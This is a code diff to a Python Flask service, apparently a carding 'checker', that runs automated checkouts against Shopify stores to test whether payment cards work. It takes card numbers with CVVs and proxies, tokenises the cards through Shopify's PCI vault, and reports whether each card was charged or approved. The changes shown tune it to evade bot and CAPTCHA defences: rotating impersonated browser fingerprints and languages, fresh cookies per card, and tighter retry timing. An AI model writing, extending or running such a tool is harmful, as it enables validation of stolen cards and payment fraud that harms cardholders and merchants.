@@ -1,13 +1,12 @@
 """
-app.py — Shopify Checkout Node (FULLY FIXED)
+app.py — Shopify Checkout Node (v3 — CAPTCHA-tuned)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-FIXES:
-  ✅ Paired UA/impersonate (was mismatched → caused CAPTCHA)
-  ✅ 3DS returns Approved=False, CardValid=True (no fake ORDER PLACED)
-  ✅ Hard wall-clock timeout wrapper (no freezes)
-  ✅ Server pollDelay used (was 2s fixed → caused wrapper timeouts)
-  ✅ BUDGET_SEC=18 (fits inside node_client 30s)
-  ✅ faulthandler dumps thread stacks every 90s
+NEW IN THIS VERSION:
+  ✅ _fresh_fingerprint(): new UA + Accept-Language per request
+  ✅ Fresh cookies — new requests.Session() per card, no state leaks
+  ✅ Fixes buyerProposal tax-retry loop (_tax_from_rejected checks both keys)
+  ✅ Tighter budget: BUDGET_SEC=15, poll max 6, submit retry max 2
+  ✅ _receipt_id() looks only in data.submitForCompletion.receipt.id (no false matches)
 """
 import os, re, html, json, time, uuid, random, string, threading
 import concurrent.futures, faulthandler, urllib3
@@ -16,13 +15,13 @@ from curl_cffi import requests
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 faulthandler.enable()
-faulthandler.dump_traceback_later(90, repeat=True)
+faulthandler.dump_traceback_later(120, repeat=True)
 
 app = Flask(__name__)
 
 WORKERS_CAP      = int(os.environ.get("WORKERS_CAP", "20"))
-BUDGET_SEC       = float(os.environ.get("BUDGET_SEC", "18"))
-HARD_REQ_TIMEOUT = float(os.environ.get("HARD_REQ_TIMEOUT", "12"))
+BUDGET_SEC       = float(os.environ.get("BUDGET_SEC", "15"))
+HARD_REQ_TIMEOUT = float(os.environ.get("HARD_REQ_TIMEOUT", "8"))
 
 _EXEC = concurrent.futures.ThreadPoolExecutor(max_workers=64, thread_name_prefix="req")
 
@@ -34,10 +33,10 @@ def _hard_req(session, method, url, hard_timeout=HARD_REQ_TIMEOUT, **kwargs):
     except concurrent.futures.TimeoutError:
         raise TimeoutError(f"hard_timeout_{int(hard_timeout)}s url={url[:70]}")
 
-def _jitter(lo=0.15, hi=0.45):
+def _jitter(lo=0.05, hi=0.20):
     time.sleep(random.uniform(lo, hi))
 
-# ── PAIRED fingerprint — UA MUST match impersonate profile ───────────────────
+# ── PAIRED fingerprints: UA MUST match impersonate ───────────────────────────
 FINGERPRINTS = [
     ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
     ("chrome120", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
@@ -47,10 +46,24 @@ FINGERPRINTS = [
     ("safari15_5","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"),
 ]
 
+_ACCEPT_LANGS = [
+    "en-US,en;q=0.9", "en-US,en;q=0.8", "en-US",
+    "en-GB,en;q=0.9,en-US;q=0.8", "en-US,en;q=0.7",
+]
+
+def _fresh_fingerprint():
+    """New fingerprint per request — fresh UA, fresh accept-language."""
+    imp, ua = random.choice(FINGERPRINTS)
+    return {
+        "impersonate":    imp,
+        "user_agent":     ua,
+        "accept_language": random.choice(_ACCEPT_LANGS),
+    }
+
 # ── PRODUCTS ─────────────────────────────────────────────────────────────────
 _PRODUCTS_LIST = []
-_PRODUCT_POOL = []
-_PRODUCT_LOCK = threading.Lock()
+_PRODUCT_POOL  = []
+_PRODUCT_LOCK  = threading.Lock()
 
 def _load_products():
     global _PRODUCTS_LIST
@@ -164,7 +177,15 @@ def _queue_token(b):
     m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""
 
 def _receipt_id(b):
-    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b)
+    """Only match data.submitForCompletion.receipt.id — avoids false positives."""
+    try:
+        d = json.loads(b)
+        r = d.get("data",{}).get("submitForCompletion",{}).get("receipt",{})
+        if isinstance(r, dict) and r.get("id"):
+            return r["id"]
+    except Exception:
+        pass
+    m = re.search(r'"receipt"\s*:\s*\{\s*"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b)
     return m.group(1) if m else ""
 
 def _receipt_session(b):
@@ -187,23 +208,32 @@ def _tax_amount(b):
     except Exception: return "0.0"
 
 def _tax_from_rejected(b):
+    """FIXED: checks both sellerProposal AND buyerProposal (was looping on buyerProposal)."""
     try:
         d = json.loads(b)
-        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
-        v2 = sp.get("tax",{}).get("totalTaxAmountV2",{}).get("amount")
-        if v2: return v2
-        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
-    except Exception: return "0.0"
+        sfc = d.get("data",{}).get("submitForCompletion",{})
+        for key in ("sellerProposal", "buyerProposal"):
+            sp = sfc.get(key, {})
+            if not isinstance(sp, dict): continue
+            v2 = sp.get("tax",{}).get("totalTaxAmountV2",{}).get("amount")
+            if v2: return v2
+            v  = sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount")
+            if v: return v
+    except Exception: pass
+    return ""
 
 def _total_from_rejected(b):
     try:
         d = json.loads(b)
-        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
-        v = sp.get("checkoutTotal",{}).get("amount")
-        if v: return v
-        for k in ("total","runningTotal"):
-            v = sp.get(k,{}).get("value",{}).get("amount")
+        sfc = d.get("data",{}).get("submitForCompletion",{})
+        for key in ("sellerProposal", "buyerProposal"):
+            sp = sfc.get(key, {})
+            if not isinstance(sp, dict): continue
+            v = sp.get("checkoutTotal",{}).get("amount")
             if v: return v
+            for k in ("total","runningTotal"):
+                v = sp.get(k,{}).get("value",{}).get("amount")
+                if v: return v
     except Exception: pass
     return ""
 
@@ -281,7 +311,7 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
     if not m: return None, None, None
     try:
         r = _hard_req(session, "GET", shop_url + m.group(1),
-                      hard_timeout=min(t_rem, 8), headers={"user-agent": ua}, timeout=t_rem)
+                      hard_timeout=min(t_rem, 6), headers={"user-agent": ua}, timeout=t_rem)
         js = r.text
         p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
         s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
@@ -293,7 +323,7 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
     except Exception:
         return None, None, None
 
-# ── PROPOSAL PAYLOAD ─────────────────────────────────────────────────────────
+# ── PROPOSAL ─────────────────────────────────────────────────────────────────
 def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False, target_any=True):
     if addr:
         sa   = _street_addr(addr["fn"], addr["ln"], addr)
@@ -364,8 +394,8 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
     }
 
 # ── PCI ──────────────────────────────────────────────────────────────────────
-def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", vault_url="",
-              vault_domain="", proxy_url="", t_rem=5):
+def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, accept_lang,
+              ident_sig="", vault_url="", vault_domain="", proxy_url="", t_rem=5):
     _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
     endpoint    = vault_url or _DEFAULT_VAULT
     scope       = vault_domain or shop_domain
@@ -376,7 +406,8 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
         "issue_number": "", "name": name},
         "payment_session_scope": scope})
     headers = {
-        "accept": "application/json", "accept-language": "en-US,en;q=0.9",
+        "accept": "application/json",
+        "accept-language": accept_lang,
         "content-type": "application/json", "origin": origin_base,
         "priority": "u=1, i",
         "referer": f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
@@ -388,29 +419,27 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
     kw = {"data": payload, "headers": headers, "timeout": t_rem}
     if proxy_url: kw["proxy"] = proxy_url
     try:
-        r = _hard_req(session, "POST", endpoint, hard_timeout=min(t_rem + 2, 9), **kw)
+        r = _hard_req(session, "POST", endpoint, hard_timeout=min(t_rem + 2, 7), **kw)
         if r.status_code == 200:
             return r.json().get("id")
         log(f"  Step 5: PCI HTTP {r.status_code}: {r.text[:100]}")
     except Exception as e:
         log(f"  Step 5: PCI EXC: {str(e)[:100]}")
     if "shopifyinc" in endpoint:
-        return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig,
-                         "https://checkout.pci.shopifycs.com/sessions", vault_domain, proxy_url, t_rem)
+        return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, accept_lang,
+                         ident_sig, "https://checkout.pci.shopifycs.com/sessions",
+                         vault_domain, proxy_url, t_rem)
     return None
 
 # ── RESPONSE HELPERS ─────────────────────────────────────────────────────────
 def _base_resp(status, *, price="0 USD", charged=False, approved=False,
                card_valid=False, elapsed_ms=None, **extra):
     d = {
-        "Response": status,
-        "Status":   status,
-        "Gate":     "Shopify Payments",
-        "Charged":  "True" if charged else "False",
+        "Response": status, "Status": status, "Gate": "Shopify Payments",
+        "Charged": "True" if charged else "False",
         "Approved": "True" if approved else "False",
         "CardValid": "True" if card_valid else "False",
-        "Price":    price,
-        "success":  charged or approved,
+        "Price": price, "success": charged or approved,
     }
     if elapsed_ms is not None: d["Time"] = str(int(elapsed_ms))
     d.update(extra)
@@ -439,13 +468,14 @@ def _classify_failed(code):
     if "INVALID" in c:                         return "INVALID_CARD",       False, False
     if "BLOCKED" in c:                         return "BLOCKED_CARD",       False, False
     if "DECLINED" in c or "DO_NOT_HONOR" in c: return "CARD_DECLINED",      False, False
+    if "CAPTCHA" in c:                         return "CAPTCHA_REQUIRED",   False, False
     return (c or "CARD_DECLINED"), False, False
 
 # ── MAIN PIPELINE ────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
     t_start = time.monotonic()
     def remain(): return BUDGET_SEC - (time.monotonic() - t_start)
-    def t_max(s): return min(s, max(1, remain()))
+    def t_max(s): return max(1, min(s, remain()))
 
     parts = card_str.split("|")
     if len(parts) < 4: return _resp("INVALID_CARD")
@@ -456,11 +486,17 @@ def _run_check(card_str, proxy_str):
     if not prod: return _resp("NO_PRODUCTS")
     shop_url, vid, price = prod["shop"], prod["vid"], prod["price"] or "1.00"
 
-    log(f"🃏 [START] {ccn[:6]}*** | Shop: {shop_url} | Vid: {vid}")
-    proxy_url = _parse_proxy(proxy_str)
-    imp, ua = random.choice(FINGERPRINTS)  # ← PAIRED, no mismatch
+    # ── FRESH fingerprint + FRESH session (no saved cookies) ────────────────
+    fp  = _fresh_fingerprint()
+    ua  = fp["user_agent"]
+    imp = fp["impersonate"]
+    accept_lang = fp["accept_language"]
 
-    session = requests.Session(impersonate=imp)
+    log(f"🃏 [START] {ccn[:6]}*** | Shop: {shop_url} | Vid: {vid} | {imp}")
+    proxy_url = _parse_proxy(proxy_str)
+
+    session = requests.Session(impersonate=imp)   # fresh cookies, always
+    session.cookies.clear()                        # belt + suspenders
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
@@ -468,12 +504,13 @@ def _run_check(card_str, proxy_str):
         cart_url = f"{shop_url}/cart/{vid}:1"
         r = None
         for cart_attempt in range(2):
-            if remain() < 8: break
+            if remain() < 6: break
             try:
                 log(f"  Step 1: Cart Request (attempt {cart_attempt+1}) -> {cart_url}")
                 r = _hard_req(session, "GET", cart_url,
-                              hard_timeout=min(14, max(6, int(remain()))),
-                              headers={"user-agent": ua}, allow_redirects=True, timeout=t_max(10))
+                              hard_timeout=t_max(9),
+                              headers={"user-agent": ua, "accept-language": accept_lang},
+                              allow_redirects=True, timeout=t_max(8))
                 log(f"  Step 1: Cart Status -> {r.status_code}")
                 if r.status_code == 200: break
             except Exception as e:
@@ -491,9 +528,10 @@ def _run_check(card_str, proxy_str):
         log(f"  Step 1: Session Token -> {'FOUND' if session_token else 'MISSING'}")
         log(f"  Step 1: Stable ID -> {'FOUND' if stable_id else 'MISSING'}")
         if not session_token or not commit_sha or not stable_id:
-            return _resp("SESSION_EXTRACT_FAILED", price=f"{price} USD")
+            return _resp("SESSION_EXTRACT_FAILED", price=f"{price} USD",
+                         elapsed_ms=(time.monotonic()-t_start)*1000)
 
-        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(6))
+        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(5))
         prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
         submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
         poll_id   = poll_id   or "b99547c8e17e88f985ec0e11a844dd1305bf14cf70e41ca10954899050ffc567"
@@ -510,7 +548,9 @@ def _run_check(card_str, proxy_str):
                 "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
 
         hdr = {
-            "accept": "application/json", "content-type": "application/json",
+            "accept": "application/json",
+            "accept-language": accept_lang,
+            "content-type": "application/json",
             "origin": shop_url, "referer": checkout_url,
             "shopify-checkout-client": "checkout-web/1.0",
             "shopify-checkout-source": f'id="{cart_token}", type="cn"',
@@ -525,18 +565,18 @@ def _run_check(card_str, proxy_str):
         prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
         use_lines = False
 
-        # Step 2: Proposal 1
+        # Step 2
         _jitter()
         try:
             log("  Step 2: Proposal 1 (Empty)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, True)
-            r1 = _hard_req(session, "POST", prop_url, hard_timeout=min(10, max(6, int(remain()))),
+            r1 = _hard_req(session, "POST", prop_url, hard_timeout=t_max(7),
                            headers=hdr, json=p, timeout=t_max(6))
             if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text and "merchandiseLines" in r1.text:
                 log("  Step 2: Swapping to 'lines' schema")
                 use_lines = True
                 p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, True)
-                r1 = _hard_req(session, "POST", prop_url, hard_timeout=min(10, max(6, int(remain()))),
+                r1 = _hard_req(session, "POST", prop_url, hard_timeout=t_max(7),
                                headers=hdr, json=p, timeout=t_max(6))
         except Exception as e:
             log(f"  Step 2: Proposal 1 EXC -> {str(e)[:100]}")
@@ -548,13 +588,13 @@ def _run_check(card_str, proxy_str):
         queue_token = _queue_token(r1.text) or None
         if not queue_token: return _resp("P1_NO_QUEUE", price=f"{amount} {currency}")
 
-        # Step 3: Proposal 2
+        # Step 3
         _jitter()
         try:
             log("  Step 3: Proposal 2 (Email)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines, True)
             p["variables"]["queueToken"] = queue_token
-            r2 = _hard_req(session, "POST", prop_url, hard_timeout=min(10, max(6, int(remain()))),
+            r2 = _hard_req(session, "POST", prop_url, hard_timeout=t_max(7),
                            headers=hdr, json=p, timeout=t_max(6))
         except Exception as e:
             log(f"  Step 3: Proposal 2 EXC -> {str(e)[:100]}")
@@ -562,14 +602,14 @@ def _run_check(card_str, proxy_str):
         log(f"  Step 3: Proposal 2 Status -> {r2.status_code}")
         if r2.status_code != 200: return _resp("P2_HTTP", price=f"{amount} {currency}")
 
-        # Step 4: Proposal 3
+        # Step 4
         _jitter()
         pm_id = ""; tax = "0.0"; amount_f = amount; shipping_required = True
         try:
             log("  Step 4: Proposal 3 (Address / Target Item)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines, False)
             p["variables"]["queueToken"] = queue_token
-            r3 = _hard_req(session, "POST", prop_url, hard_timeout=min(10, max(6, int(remain()))),
+            r3 = _hard_req(session, "POST", prop_url, hard_timeout=t_max(7),
                            headers=hdr, json=p, timeout=t_max(6))
             if r3.status_code == 200:
                 r3_text = r3.text
@@ -577,8 +617,8 @@ def _run_check(card_str, proxy_str):
                 log(f"  Step 4: isShippingRequired -> {shipping_required}")
                 if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
                     return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
-                pm_id  = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
-                tax    = _tax_amount(r3_text)
+                pm_id    = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
+                tax      = _tax_amount(r3_text)
                 amount_f = _checkout_total(r3_text) or amount
                 queue_token = _queue_token(r3_text) or queue_token
             else:
@@ -598,9 +638,9 @@ def _run_check(card_str, proxy_str):
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
         log("  Step 5: Tokenizing Card")
-        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
+        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua, accept_lang,
                         ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom,
-                        proxy_url=proxy_url, t_rem=t_max(6))
+                        proxy_url=proxy_url, t_rem=t_max(5))
         if not sid:
             return _resp("PCI_FAILED", price=f"{amount_f} {currency}",
                          elapsed_ms=(time.monotonic()-t_start)*1000)
@@ -697,15 +737,15 @@ def _run_check(card_str, proxy_str):
         cur_tax = tax or "0.0"
         cur_tot = amount_f
         log("  Step 6: Submitting Order")
-        for tax_attempt in range(3):
-            if remain() < 8:
+        for tax_attempt in range(2):   # was 3 — 2 is enough
+            if remain() < 9:
                 log("  Step 6: Budget low, stopping retries")
                 break
             try:
                 r_submit = _hard_req(session, "POST",
                     f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
-                    hard_timeout=min(14, max(8, int(remain()))),
-                    json=_build_submit(cur_tax, cur_tot), headers=hdr, timeout=t_max(10))
+                    hard_timeout=t_max(9),
+                    json=_build_submit(cur_tax, cur_tot), headers=hdr, timeout=t_max(8))
                 body = r_submit.text
             except TimeoutError as e:
                 log(f"  Step 6: Submit hard-timeout -> {e}")
@@ -721,42 +761,43 @@ def _run_check(card_str, proxy_str):
                 if nt: cur_tax = nt
                 if nT: cur_tot = nT
                 price_str = f"{cur_tot} {currency}"
-                _jitter()
+                _jitter(0.05, 0.15)
                 continue
             break
 
-        log(f"  Step 6: Submit Response -> {body[:400]}")
+        log(f"  Step 6: Submit Response -> {body[:300]}")
 
         # Step 7: Poll
         rid = _receipt_id(body)
         rss = _receipt_session(body) or session_token
         if not rid:
+            log(f"  Step 7: No receipt in submit body")
             return _resp_submit(body, price=price_str, status="NO_RECEIPT",
                                 elapsed_ms=(time.monotonic()-t_start)*1000)
 
         pdm = re.search(r'"pollDelay"\s*:\s*(\d+)', body)
-        poll_delay = min(max((int(pdm.group(1)) / 1000.0) if pdm else 0.5, 0.3), 1.5)
+        poll_delay = min(max((int(pdm.group(1)) / 1000.0) if pdm else 0.5, 0.3), 1.0)
 
         log(f"  Step 7: Polling receipt {rid[:50]}... (delay={poll_delay:.2f}s)")
-        poll_headers = hdr.copy(); poll_headers["accept-language"] = "en-US"
+        poll_headers = hdr.copy()
         all_poll_bodies = []; last_pb = ""; last_http = None
 
-        for poll_attempt in range(1, 12):
+        for poll_attempt in range(1, 7):   # was 11 → 6
             if remain() < 3:
                 log(f"  Step 7: Budget exhausted at poll {poll_attempt}")
                 break
-            time.sleep(poll_delay + random.uniform(0, 0.25))
+            time.sleep(poll_delay)
             poll_data = {"variables": {"receiptId": rid, "sessionToken": rss},
                          "operationName": "PollForReceipt", "id": poll_id}
             try:
                 r_p = _hard_req(session, "POST",
                     f"{shop_url}/checkouts/internal/graphql/persisted?operationName=PollForReceipt",
-                    hard_timeout=min(12, max(6, int(remain()))),
-                    headers=poll_headers, json=poll_data, timeout=t_max(10))
+                    hard_timeout=t_max(6),
+                    headers=poll_headers, json=poll_data, timeout=t_max(6))
                 pb = r_p.text
                 last_pb = pb; last_http = r_p.status_code
                 all_poll_bodies.append({"attempt": poll_attempt, "http": r_p.status_code, "body": pb})
-                log(f"    Poll {poll_attempt}/10: HTTP {r_p.status_code} | {pb[:200]}")
+                log(f"    Poll {poll_attempt}/6: HTTP {r_p.status_code} | {pb[:180]}")
 
                 compact = pb.replace(" ", "")
                 if '"__typename":"ProcessedReceipt"' in compact:
@@ -804,7 +845,7 @@ def route_check():
         proxy = request.args.get("proxy", "")
         if not card: return _resp("MISSING_CARD")
         return _run_check(card, proxy)
-    except Exception as e:
+    except Exception:
         return _resp("ROUTE_EXC")
     finally:
         _dec_busy()
